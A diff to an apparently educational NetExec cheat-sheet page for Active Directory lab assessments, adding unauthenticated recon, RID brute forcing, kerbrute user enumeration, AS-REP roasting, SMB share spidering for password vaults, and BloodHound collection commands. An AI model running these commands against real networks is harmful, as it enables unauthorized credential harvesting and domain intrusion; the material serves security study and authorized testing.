@@ -44,6 +44,18 @@ nxc winrm TARGET_IP -u USER -p 'PASSWORD'
 nxc mssql TARGET_IP -u USER -p 'PASSWORD'
 ```
 
+## Common authentication & directory flags
+
+**Kali**
+
+```bash
+nxc smb DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' --users --pass-pol
+nxc smb TARGET_IP -u USER -p 'PASSWORD' --local-auth
+nxc ldap DC_IP -d DOMAIN_FQDN -u USER -k --use-kcache
+```
+
+Use --local-auth for local accounts, -k --use-kcache for Kerberos tickets, and --continue-on-success when testing authorized user lists.
+
 ## If it fails
 
 | Symptom | Check |
@@ -52,26 +64,56 @@ nxc mssql TARGET_IP -u USER -p 'PASSWORD'
 
 ## Notebook recipes
 
-73 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+74 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
-<Accordion title="Step 2: Domain Discovery &amp; BloodHound Collection">
+<Accordion title="Step 1: Unauthenticated Recon, User List &amp; Initial Domain Credential">
 
-### Step 2: Domain Discovery & BloodHound Collection
+### Step 1: Unauthenticated Recon, User List & Initial Domain Credential
 
 **AD Enumeration & Attacks: Skills Assessment Hub**
 
 ```bash
-# From Kali through the tunnel:
-nxc smb INTERNAL_CIDR -d DOMAIN_FQDN -u USER -p 'PASSWORD'
-nxc smb DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' --users --groups --pass-pol
+# Map open ports, domain FQDN, and DC hostname
+nmap -sC -sV -p 53,80,88,135,139,389,443,445,636,3268,3389,5985 TARGET_IP -oA nmap/ad-part1
+
+# Null / guest checks & RID cycling if permitted
+nxc smb TARGET_IP -u '' -p '' --shares
+nxc smb TARGET_IP -u 'guest' -p '' --rid-brute
+kerbrute userenum -d DOMAIN_FQDN --dc DC_IP usernames.txt
+impacket-GetNPUsers DOMAIN_FQDN/ -dc-ip DC_IP -usersfile usernames.txt -no-pass -format hashcat -outputfile asrep.hash
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD Enumeration & Attacks: Skills Assessment Hub — Step 1: Unauthenticated Recon, User List & Initial Domain Credential](/active-directory/assessment#step-1-unauthenticated-recon-user-list-&-initial-domain-credential)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Step 2: Authenticated Domain Enumeration &amp; BloodHound Collection">
+
+### Step 2: Authenticated Domain Enumeration & BloodHound Collection
+
+**AD Enumeration & Attacks: Skills Assessment Hub**
+
+```bash
+# Check password policy BEFORE any password spraying
+nxc smb DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' --pass-pol --users --groups --shares
+
+# Spider readable SMB shares for scripts, KeePass/PasswordSafe vaults, XMLs, and backups
+nxc smb INTERNAL_CIDR -d DOMAIN_FQDN -u USER -p 'PASSWORD' -M spider_plus
+
+# Collect BloodHound CE graph (add --dns-tcp when running over a tunnel)
 bloodhound-ce-python -d DOMAIN_FQDN -u USER -p 'PASSWORD' -ns DC_IP -c All --zip --dns-tcp
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [AD Enumeration & Attacks: Skills Assessment Hub — Step 2: Domain Discovery & BloodHound Collection](/active-directory/assessment#step-2-domain-discovery-&-bloodhound-collection)
+**Original note sections:** [AD Enumeration & Attacks: Skills Assessment Hub — Step 2: Authenticated Domain Enumeration & BloodHound Collection](/active-directory/assessment#step-2-authenticated-domain-enumeration-&-bloodhound-collection)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1755,6 +1797,8 @@ SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\admi
 - [Official documentation 1](https://www.netexec.wiki/)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
